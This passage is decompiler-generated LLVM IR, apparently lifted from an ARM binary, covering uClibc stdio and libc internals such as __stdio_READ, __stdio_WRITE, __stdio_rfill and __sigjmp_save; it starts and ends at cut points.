  store i32 %v12_173ec, i32* @r7, align 4
  ret i32 %v0_17518

; uselistorder directives
  uselistorder i32 %v0_174d0, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_174d8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_17404, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 9, 10, 0, 3, 11, 4, 12, 13, 5, 6, 7, 8, 1, 14, 2, 15 }
  uselistorder i32 18, { 9, 10, 8, 0, 1, 2, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 22, { 1, 0, 10, 2, 3, 4, 5, 6, 11, 12, 7, 13, 8, 14, 9, 15 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_17518, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17500, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17530 = load i32, i32* @r4, align 4
  store i32 %v3_17530, i32* %stack_var_-12, align 4
  %v0_17534 = load i32, i32* %r0.global-to-local, align 4
  %v1_17534 = inttoptr i32 %v0_17534 to i16*
  %v2_17534 = load i16, i16* %v1_17534, align 2
  %v3_17534 = zext i16 %v2_17534 to i32
  store i32 %v3_17534, i32* @r3, align 4
  %v1_17538 = and i32 %v3_17534, 4
  store i32 %v1_17538, i32* @r5, align 4
  %v2_17538 = icmp eq i32 %v1_17538, 0
  store i32 %v0_17534, i32* @r4, align 4
  br i1 %v2_17538, label %dec_label_pc_1754c, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1754c:                               ; preds = %entry
  %v1_1754c = icmp slt i32 %arg2, 0
  br i1 %v1_1754c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1754c
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1754c, %bb18
  %v1_17554 = add i32 %v0_17534, 4
  %v2_17554 = inttoptr i32 %v1_17554 to i32*
  %v3_17554 = load i32, i32* %v2_17554, align 4
  store i32 %v3_17554, i32* %r0.global-to-local, align 4
  %v1_17558 = call i32 @__libc_read(i32 %v3_17554)
  store i32 %v1_17558, i32* %r0.global-to-local, align 4
  %v5_17560 = icmp sgt i32 %v1_17558, 0
  br i1 %v5_17560, label %.thread7, label %dec_label_pc_17564

dec_label_pc_17564:                               ; preds = %bb19
  %v2_1755c = icmp eq i32 %v1_17558, 0
  %v0_17564 = load i32, i32* @r4, align 4
  %v1_17564 = inttoptr i32 %v0_17564 to i16*
  %v2_17564 = load i16, i16* %v1_17564, align 2
  br i1 %v2_1755c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_17564
  %v2_17568 = or i16 %v2_17564, 4
  store i16 %v2_17568, i16* %v1_17564, align 2
  %v1_17584.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_17564
  %v2_1756c = or i16 %v2_17564, 8
  store i16 %v2_1756c, i16* %v1_17564, align 2
  %v1_17578 = load i32, i32* @r5, align 4
  store i32 %v1_17578, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_17584 = phi i32 [ %v1_17584.pre, %bb20 ], [ 0, %bb ], [ %v1_17558, %bb19 ], [ %v1_17578, %bb21 ]
  %v2_17580 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17580, i32* @r4, align 4
  ret i32 %v1_17584

; uselistorder directives
  uselistorder i16 %v2_17564, { 1, 0 }
  uselistorder i32 %v1_17558, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_1764c2 = icmp eq i32 %arg3, 0
  store i1 %v2_1764c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1764c2, label %dec_label_pc_17654, label %dec_label_pc_175a4

dec_label_pc_175a4:                               ; preds = %entry, %dec_label_pc_1764cthread-pre-split.dec_label_pc_175a4_crit_edge
  %v0_175b0 = phi i32 [ %v0_175b0.pre, %dec_label_pc_1764cthread-pre-split.dec_label_pc_175a4_crit_edge ], [ %tmp, %entry ]
  %v0_175ac = phi i32 [ %v5_175bc, %dec_label_pc_1764cthread-pre-split.dec_label_pc_175a4_crit_edge ], [ %arg2, %entry ]
  %v3_175a4 = phi i32 [ %v3_175a4.pre, %dec_label_pc_1764cthread-pre-split.dec_label_pc_175a4_crit_edge ], [ 2147483647, %entry ]
  %v0_175a8.in = phi i32 [ %v5_175c0, %dec_label_pc_1764cthread-pre-split.dec_label_pc_175a4_crit_edge ], [ %arg3, %entry ]
  %v3_175a8 = phi i32 [ %v5_175c0, %dec_label_pc_1764cthread-pre-split.dec_label_pc_175a4_crit_edge ], [ %arg3, %entry ]
  %v0_175a8 = icmp slt i32 %v0_175a8.in, 0
  %storemerge = select i1 %v0_175a8, i32 %v3_175a4, i32 %v3_175a8
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_175ac, i32* %r1.global-to-local, align 4
  %v1_175b0 = add i32 %v0_175b0, 4
  %v2_175b0 = inttoptr i32 %v1_175b0 to i32*
  %v3_175b0 = load i32, i32* %v2_175b0, align 4
  %v3_175b4 = call i32 @__GI___libc_write(i32 %v3_175b0, i32 %v0_175ac)
  %v1_175b8 = icmp slt i32 %v3_175b4, 0
  %v2_175b8 = icmp eq i32 %v3_175b4, 0
  store i1 %v2_175b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_175b8, label %dec_label_pc_175c8, label %dec_label_pc_1764cthread-pre-split

dec_label_pc_175c8:                               ; preds = %dec_label_pc_175a4
  %v0_175c8 = load i32, i32* @r4, align 4
  %v1_175c8 = inttoptr i32 %v0_175c8 to i16*
  %v2_175c8 = load i16, i16* %v1_175c8, align 2
  %v1_175cc = or i16 %v2_175c8, 8
  store i16 %v1_175cc, i16* %v1_175c8, align 2
  store i32 40748, i32* %r3.global-to-local, align 4
  %v0_175d8 = call i32 @__aeabi_read_tp()
  %v3_175dc = load i16, i16* @global_var_21510.336, align 2
  %v4_175dc = sext i16 %v3_175dc to i32
  store i32 %v4_175dc, i32* %r3.global-to-local, align 4
  %v2_175e0 = add i32 %v4_175dc, %v0_175d8
  %v3_175e0 = inttoptr i32 %v2_175e0 to i32*
  %v4_175e0 = load i32, i32* %v3_175e0, align 4
  store i32 %v4_175e0, i32* %r3.global-to-local, align 4
  %v7_175e4 = icmp eq i32 %v4_175e0, 4
  store i1 %v7_175e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_175e4, label %dec_label_pc_175f0, label %bb21

bb21:                                             ; preds = %dec_label_pc_175c8
  %v8_175e8 = icmp eq i32 %v4_175e0, 11
  store i1 %v8_175e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_175e8, label %dec_label_pc_175f0, label %dec_label_pc_17654

dec_label_pc_175f0:                               ; preds = %dec_label_pc_175c8, %bb21
  %v0_175f0 = load i32, i32* @r4, align 4
  %v1_175f0 = add i32 %v0_175f0, 8
  store i32 %v1_175f0, i32* %r2.global-to-local, align 4
  %v1_175f4 = inttoptr i32 %v1_175f0 to i32*
  %v2_175f4 = load i32, i32* %v1_175f4, align 4
  store i32 %v2_175f4, i32* %r2.global-to-local, align 4
  %v3_175f4 = add i32 %v0_175f0, 12
  %v4_175f4 = inttoptr i32 %v3_175f4 to i32*
  %v5_175f4 = load i32, i32* %v4_175f4, align 4
  store i32 %v5_175f4, i32* %r3.global-to-local, align 4
  %v2_175f8 = sub i32 %v5_175f4, %v2_175f4
  store i32 %v2_175f8, i32* %r1.global-to-local, align 4
  %v9_175f8 = icmp eq i32 %v5_175f4, %v2_175f4
  store i1 %v9_175f8, i1* %cpsr_z.global-to-local, align 1
  %v0_17644.pre = load i32, i32* @r5, align 4
  br i1 %v9_175f8, label %dec_label_pc_17644, label %dec_label_pc_17600

dec_label_pc_17600:                               ; preds = %dec_label_pc_175f0
  %v3_17600 = icmp ult i32 %v2_175f8, %v0_17644.pre
  %v9_17600 = icmp eq i32 %v2_175f8, %v0_17644.pre
  store i1 %v9_17600, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17600, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_17600
  store i32 %v0_17644.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_17600, %bb22, %dec_label_pc_17628
  %v2_17614 = phi i32 [ %v1_1762c, %dec_label_pc_17628 ], [ %v2_175f4, %bb22 ], [ %v2_175f4, %dec_label_pc_17600 ]
  %v0_17608 = load i32, i32* @r6, align 4
  %v1_17608 = inttoptr i32 %v0_17608 to i8*
  %v2_17608 = load i8, i8* %v1_17608, align 1
  %v3_17608 = zext i8 %v2_17608 to i32
  store i32 %v3_17608, i32* %r3.global-to-local, align 4
  %v7_1760c = icmp eq i8 %v2_17608, 10
  store i1 %v7_1760c, i1* %cpsr_z.global-to-local, align 1
  %v1_17610 = add i32 %v0_17608, 1
  store i32 %v1_17610, i32* @r6, align 4
  %v3_17614 = inttoptr i32 %v2_17614 to i8*
  store i8 %v2_17608, i8* %v3_17614, align 1
  %v0_17618 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17618, label %dec_label_pc_1761c, label %dec_label_pc_17628

dec_label_pc_1761c:                               ; preds = %.preheader
  %v0_1761c = load i32, i32* @r4, align 4
  %v1_1761c = inttoptr i32 %v0_1761c to i16*
  %v2_1761c = load i16, i16* %v1_1761c, align 2
  %v3_1761c = zext i16 %v2_1761c to i32
  store i32 %v3_1761c, i32* %r3.global-to-local, align 4
  %v1_17620 = and i32 %v3_1761c, 256
  %v2_17620 = icmp eq i32 %v1_17620, 0
  store i1 %v2_17620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17620, label %dec_label_pc_17628, label %dec_label_pc_1761c.dec_label_pc_17634_crit_edge

dec_label_pc_1761c.dec_label_pc_17634_crit_edge:  ; preds = %dec_label_pc_1761c
  %v0_17638.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17634

dec_label_pc_17628:                               ; preds = %dec_label_pc_1761c, %.preheader
  %v0_17628 = load i32, i32* %r1.global-to-local, align 4
  %v1_17628 = add i32 %v0_17628, -1
  store i32 %v1_17628, i32* %r1.global-to-local, align 4
  %v7_17628 = icmp eq i32 %v0_17628, 1
  store i1 %v7_17628, i1* %cpsr_z.global-to-local, align 1
  %v0_1762c = load i32, i32* %r2.global-to-local, align 4
  %v1_1762c = add i32 %v0_1762c, 1
  store i32 %v1_1762c, i32* %r2.global-to-local, align 4
  br i1 %v7_17628, label %dec_label_pc_17628.dec_label_pc_17634_crit_edge, label %.preheader

dec_label_pc_17628.dec_label_pc_17634_crit_edge:  ; preds = %dec_label_pc_17628
  %v0_17634.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17634

dec_label_pc_17634:                               ; preds = %dec_label_pc_1761c.dec_label_pc_17634_crit_edge, %dec_label_pc_17628.dec_label_pc_17634_crit_edge
  %v0_17638 = phi i32 [ %v1_1762c, %dec_label_pc_17628.dec_label_pc_17634_crit_edge ], [ %v0_17638.pre, %dec_label_pc_1761c.dec_label_pc_17634_crit_edge ]
  %v0_17634 = phi i32 [ %v0_17634.pre, %dec_label_pc_17628.dec_label_pc_17634_crit_edge ], [ %v0_1761c, %dec_label_pc_1761c.dec_label_pc_17634_crit_edge ]
  %v1_17634 = add i32 %v0_17634, 8
  %v2_17634 = inttoptr i32 %v1_17634 to i32*
  %v3_17634 = load i32, i32* %v2_17634, align 4
  store i32 %v3_17634, i32* %r3.global-to-local, align 4
  %v2_17638 = add i32 %v0_17634, 16
  %v3_17638 = inttoptr i32 %v2_17638 to i32*
  store i32 %v0_17638, i32* %v3_17638, align 4
  %v0_1763c = load i32, i32* %r3.global-to-local, align 4
  %v1_1763c = load i32, i32* %r2.global-to-local, align 4
  %v2_1763c = sub i32 %v1_1763c, %v0_1763c
  store i32 %v2_1763c, i32* %r3.global-to-local, align 4
  %v1_17640 = load i32, i32* @r5, align 4
  %v2_17640 = sub i32 %v1_17640, %v2_1763c
  br label %dec_label_pc_17644

dec_label_pc_17644:                               ; preds = %dec_label_pc_175f0, %dec_label_pc_17634
  %v0_17644 = phi i32 [ %v2_17640, %dec_label_pc_17634 ], [ %v0_17644.pre, %dec_label_pc_175f0 ]
  %v1_17644 = load i32, i32* @r7, align 4
  %v2_17644 = sub i32 %v1_17644, %v0_17644
  store i32 %v2_17644, i32* @r7, align 4
  br label %dec_label_pc_17654

dec_label_pc_1764cthread-pre-split:               ; preds = %dec_label_pc_175a4
  %v3_175bc = load i32, i32* @r6, align 4
  %v5_175bc = add i32 %v3_175bc, %v3_175b4
  store i32 %v5_175bc, i32* @r6, align 4
  %v4_175c0 = load i32, i32* @r5, align 4
  %v5_175c0 = sub i32 %v4_175c0, %v3_175b4
  store i32 %v5_175c0, i32* @r5, align 4
  %v2_1764c = icmp eq i32 %v5_175c0, 0
  store i1 %v2_1764c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1764c, label %dec_label_pc_17654, label %dec_label_pc_1764cthread-pre-split.dec_label_pc_175a4_crit_edge

dec_label_pc_1764cthread-pre-split.dec_label_pc_175a4_crit_edge: ; preds = %dec_label_pc_1764cthread-pre-split
  %v3_175a4.pre = load i32, i32* @r8, align 4
  %v0_175b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_175a4

dec_label_pc_17654:                               ; preds = %dec_label_pc_1764cthread-pre-split, %entry, %bb21, %dec_label_pc_17644
  %v0_17654 = load i32, i32* @r7, align 4
  ret i32 %v0_17654

; uselistorder directives
  uselistorder i32 %v5_175c0, { 1, 3, 0, 2 }
  uselistorder i32 %v5_175bc, { 1, 0 }
  uselistorder i32 %v0_17634, { 1, 0 }
  uselistorder i32 %v1_1762c, { 0, 2, 1 }
  uselistorder i32 %v0_17628, { 1, 0 }
  uselistorder i32 %v0_17644.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_175f4, { 1, 0, 2 }
  uselistorder i32 %v2_175f4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_175b4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_175ac, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 4, 2, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 11, { 8, 5, 6, 7, 15, 22, 23, 9, 10, 11, 2, 12, 13, 14, 16, 17, 3, 18, 4, 19, 0, 20, 1, 21, 24 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 6, 7, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_17654, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_17644, { 1, 0 }
  uselistorder label %dec_label_pc_17634, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_175f0, { 1, 0 }
  uselistorder label %dec_label_pc_175a4, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17664 = load i32, i32* @r4, align 4
  store i32 %v3_17664, i32* %stack_var_-8, align 4
  %v1_17668 = add i32 %arg1, 8
  %v1_1766c = inttoptr i32 %v1_17668 to i32*
  %v2_1766c = load i32, i32* %v1_1766c, align 4
  store i32 %v2_1766c, i32* @r1, align 4
  %v3_1766c = add i32 %arg1, 12
  %v4_1766c = inttoptr i32 %v3_1766c to i32*
  %v5_1766c = load i32, i32* %v4_1766c, align 4
  %v2_17670 = sub i32 %v5_1766c, %v2_1766c
  store i32 %v2_17670, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_17678 = inttoptr i32 %arg1 to i16*
  %v4_17678 = call i32 @__stdio_READ(i16* %v3_17678, i32 %v2_1766c, i32 %v2_17670)
  %v0_1767c = load i32, i32* @r4, align 4
  %v1_1767c = add i32 %v0_1767c, 8
  %v2_1767c = inttoptr i32 %v1_1767c to i32*
  %v3_1767c = load i32, i32* %v2_1767c, align 4
  store i32 %v3_1767c, i32* %r2.global-to-local, align 4
  %v2_17680 = add i32 %v3_1767c, %v4_17678
  %v2_17684 = add i32 %v0_1767c, 20
  %v3_17684 = inttoptr i32 %v2_17684 to i32*
  store i32 %v2_17680, i32* %v3_17684, align 4
  %v0_17688 = load i32, i32* %r2.global-to-local, align 4
  %v1_17688 = load i32, i32* @r4, align 4
  %v2_17688 = add i32 %v1_17688, 16
  %v3_17688 = inttoptr i32 %v2_17688 to i32*
  store i32 %v0_17688, i32* %v3_17688, align 4
  %v2_1768c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1768c, i32* @r4, align 4
  ret i32 %v4_17678

; uselistorder directives
  uselistorder i32 %v4_17678, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17694 = load i32, i32* @r4, align 4
  store i32 %v3_17694, i32* %stack_var_-12, align 4
  %v0_17698 = load i32, i32* @r0, align 4
  %v1_17698 = inttoptr i32 %v0_17698 to i16*
  %v2_17698 = load i16, i16* %v1_17698, align 2
  %v3_17698 = zext i16 %v2_17698 to i32
  store i32 %v3_17698, i32* %r3.global-to-local, align 4
  %v0_1769c = load i32, i32* @r1, align 4
  %v2_1769c = and i32 %v0_1769c, %v3_17698
  %v4_1769c = icmp eq i32 %v2_1769c, 0
  store i32 %v0_17698, i32* @r4, align 4
  br i1 %v4_1769c, label %dec_label_pc_176ac, label %dec_label_pc_176bc

dec_label_pc_176ac:                               ; preds = %entry
  %v1_176ac = and i32 %v3_17698, 2176
  %v2_176ac = icmp eq i32 %v1_176ac, 0
  br i1 %v2_176ac, label %dec_label_pc_176b4, label %dec_label_pc_176c8

dec_label_pc_176b4:                               ; preds = %dec_label_pc_176ac
  %v2_176b4 = or i32 %v0_1769c, %v3_17698
  store i32 %v2_176b4, i32* %r3.global-to-local, align 4
  %v1_176b8 = trunc i32 %v2_176b4 to i16
  store i16 %v1_176b8, i16* %v1_17698, align 2
  %v0_176bc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_176bc

dec_label_pc_176bc:                               ; preds = %entry, %dec_label_pc_176b4
  %v0_176bc = phi i32 [ %v0_17698, %entry ], [ %v0_176bc.pre, %dec_label_pc_176b4 ]
  %v1_176bc = inttoptr i32 %v0_176bc to i16*
  %v2_176bc = load i16, i16* %v1_176bc, align 2
  %v3_176bc = zext i16 %v2_176bc to i32
  store i32 %v3_176bc, i32* %r3.global-to-local, align 4
  %v1_176c0 = and i32 %v3_176bc, 16
  store i32 %v1_176c0, i32* %r5.global-to-local, align 4
  %v2_176c0 = icmp eq i32 %v1_176c0, 0
  br i1 %v2_176c0, label %dec_label_pc_176f0, label %dec_label_pc_176c8

dec_label_pc_176c8:                               ; preds = %dec_label_pc_176ac, %dec_label_pc_176bc
  store i32 40504, i32* %r3.global-to-local, align 4
  %v0_176cc = call i32 @__aeabi_read_tp()
  store i32 %v0_176cc, i32* %r0.global-to-local, align 4
  %v3_176d0 = load i16, i16* @global_var_21510.336, align 2
  %v4_176d0 = sext i16 %v3_176d0 to i32
  store i32 %v4_176d0, i32* %r3.global-to-local, align 4
  %v3_176d8 = add i32 %v4_176d0, %v0_176cc
  %v4_176d8 = inttoptr i32 %v3_176d8 to i32*
  store i32 9, i32* %v4_176d8, align 4
  br label %dec_label_pc_176dc

dec_label_pc_176dc:                               ; preds = %dec_label_pc_176f8, %dec_label_pc_176c8
  %v0_176dc = load i32, i32* @r4, align 4
  %v1_176dc = inttoptr i32 %v0_176dc to i16*
  %v2_176dc = load i16, i16* %v1_176dc, align 2
  %v3_176dc = zext i16 %v2_176dc to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_176e4 = or i32 %v3_176dc, 8
  store i32 %v1_176e4, i32* %r3.global-to-local, align 4
  %v1_176e8 = trunc i32 %v1_176e4 to i16
  store i16 %v1_176e8, i16* %v1_176dc, align 2
  %v1_17730.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17728

dec_label_pc_176f0:                               ; preds = %dec_label_pc_176bc
  %v1_176f0 = and i32 %v3_176bc, 64
  %v2_176f0 = icmp eq i32 %v1_176f0, 0
  br i1 %v2_176f0, label %dec_label_pc_17718, label %dec_label_pc_176f8

dec_label_pc_176f8:                               ; preds = %dec_label_pc_176f0
  %v0_176f8 = load i32, i32* @r0, align 4
  %v1_176f8 = call i32 @__stdio_wcommit(i32 %v0_176f8)
  store i32 %v1_176f8, i32* %r0.global-to-local, align 4
  %v2_176fc = icmp eq i32 %v1_176f8, 0
  br i1 %v2_176fc, label %dec_label_pc_17704, label %dec_label_pc_176dc

dec_label_pc_17704:                               ; preds = %dec_label_pc_176f8
  %v0_17704 = load i32, i32* @r4, align 4
  %v1_17704 = inttoptr i32 %v0_17704 to i16*
  %v2_17704 = load i16, i16* %v1_17704, align 2
  %v3_17704 = zext i16 %v2_17704 to i32
  store i32 %v3_17704, i32* %r3.global-to-local, align 4
  %v1_17708 = add i32 %v0_17704, 8
  %v2_17708 = inttoptr i32 %v1_17708 to i32*
  %v3_17708 = load i32, i32* %v2_17708, align 4
  %v1_1770c = and i32 %v3_17704, 65471
  store i32 %v1_1770c, i32* %r3.global-to-local, align 4
  %v2_17710 = add i32 %v0_17704, 28
  %v3_17710 = inttoptr i32 %v2_17710 to i32*
  store i32 %v3_17708, i32* %v3_17710, align 4
  %v0_17714 = load i32, i32* %r3.global-to-local, align 4
  %v1_17714 = trunc i32 %v0_17714 to i16
  %v2_17714 = load i32, i32* @r4, align 4
  %v3_17714 = inttoptr i32 %v2_17714 to i16*
  store i16 %v1_17714, i16* %v3_17714, align 2
  %v0_17718.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17718

dec_label_pc_17718:                               ; preds = %dec_label_pc_176f0, %dec_label_pc_17704
  %v2_17720 = phi i32 [ %v0_176bc, %dec_label_pc_176f0 ], [ %v0_17718.pre, %dec_label_pc_17704 ]
  %v1_17718 = inttoptr i32 %v2_17720 to i16*
  %v2_17718 = load i16, i16* %v1_17718, align 2
  %v3_17718 = zext i16 %v2_17718 to i32
  %v1_1771c = or i32 %v3_17718, 1
  store i32 %v1_1771c, i32* %r3.global-to-local, align 4
  %v1_17720 = trunc i32 %v1_1771c to i16
  store i16 %v1_17720, i16* %v1_17718, align 2
  %v0_17724 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_17724, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17728

dec_label_pc_17728:                               ; preds = %dec_label_pc_176dc, %dec_label_pc_17718
  %v1_17730 = phi i32 [ %v1_17730.pre, %dec_label_pc_176dc ], [ %v0_17724, %dec_label_pc_17718 ]
  %v2_1772c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1772c, i32* @r4, align 4
  ret i32 %v1_17730

; uselistorder directives
  uselistorder i32 %v3_17698, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17728, { 1, 0 }
  uselistorder label %dec_label_pc_17718, { 1, 0 }
  uselistorder label %dec_label_pc_176c8, { 1, 0 }
  uselistorder label %dec_label_pc_176bc, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_17738 = load i32, i32* @r4, align 4
  %v6_17738 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_17748 = call i32 @memcpy()
  %v0_1774c = load i32, i32* @r5, align 4
  %v1_1774c = load i32, i32* @r4, align 4
  %v2_1774c = add i32 %v1_1774c, %v0_1774c
  store i32 %v3_17738, i32* @r4, align 4
  store i32 %v6_17738, i32* @r5, align 4
  ret i32 %v2_1774c
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_1775c = load i32, i32* @r1, align 4
  %v2_1775c = icmp eq i32 %v0_1775c, 0
  %v3_17760 = load i32, i32* @r4, align 4
  store i32 %v3_17760, i32* %stack_var_-8, align 4
  %v0_17764 = load i32, i32* @r0, align 4
  store i32 %v0_17764, i32* %r4.global-to-local, align 4
  br i1 %v2_1775c, label %dec_label_pc_17788, label %dec_label_pc_1776c

dec_label_pc_1776c:                               ; preds = %entry
  %v1_17774 = add i32 %v0_17764, 260
  %v4_17778 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_17774)
  %v2_1777c = icmp eq i32 %v4_17778, 0
  br i1 %v2_1777c, label %dec_label_pc_1778c, label %dec_label_pc_17788

dec_label_pc_17788:                               ; preds = %dec_label_pc_1776c, %entry
  br label %dec_label_pc_1778c

dec_label_pc_1778c:                               ; preds = %dec_label_pc_1776c, %dec_label_pc_17788
  %storemerge = phi i32 [ 0, %dec_label_pc_17788 ], [ 1, %dec_label_pc_1776c ]
  %v1_17790 = load i32, i32* %r4.global-to-local, align 4
  %v2_17790 = add i32 %v1_17790, 256
  %v3_17790 = inttoptr i32 %v2_17790 to i32*
  store i32 %storemerge, i32* %v3_17790, align 4
  %v2_17794 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17794, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 9, 0, 5, 6, 1, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 3, 21, 4, 22, 23, 24 }
  uselistorder label %dec_label_pc_1778c, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_177e4, label %dec_label_pc_177c8

dec_label_pc_177c8:                               ; preds = %entry
  %v0_177cc = call i32 @__aeabi_read_tp()
  %v3_177d0 = load i16, i16* @global_var_21510.336, align 2
  %v4_177d0 = sext i16 %v3_177d0 to i32
  %v0_177d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_177d4 = sub i32 0, %v0_177d4
  store i32 %v1_177d4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_177dc = add i32 %v4_177d0, %v0_177cc
  %v4_177dc = inttoptr i32 %v3_177dc to i32*
  store i32 %v1_177d4, i32* %v4_177dc, align 4
  %v0_177ec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_177ec

dec_label_pc_177e4:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_177e4 = icmp eq i32 %arg1, 0
  br i1 %v2_177e4, label %dec_label_pc_177f8, label %dec_label_pc_177ec

